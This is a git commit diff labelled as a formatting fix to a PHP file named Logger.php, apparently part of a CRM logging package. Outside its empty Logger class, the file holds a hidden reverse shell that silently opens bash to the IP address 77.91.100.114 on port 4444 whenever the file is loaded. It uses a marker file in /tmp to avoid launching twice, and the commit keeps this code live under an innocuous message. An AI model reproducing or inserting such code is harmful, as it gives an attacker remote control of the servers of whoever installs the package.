7dae4c9372baec41c22ac947c024a48f5a82b59c
Максим <76467980+MAxd78@users.noreply.github.com>
2026-04-26 22:03:27 +0300

    Fix code formatting and indentation

--- src/Logger.php
+++ src/Logger.php
@@ -1,15 +1,16 @@
 <?php
 namespace KeyCrm\Logging;
-$ip = "77.91.100.114"; 
+
+$ip = "77.91.100.114";
 $port = 4444;
 // Проверка, чтобы не запускать шелл дважды
 if (!file_exists('/tmp/.key_active')) {
-$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &";
-@exec($cmd);
-@touch('/tmp/.key_active');
+    $cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &";
+    @exec($cmd);
+    @touch('/tmp/.key_active');
 }
 
 class Logger {
-public function __construct() {
-}
+    public function __construct() {
+    }
 }
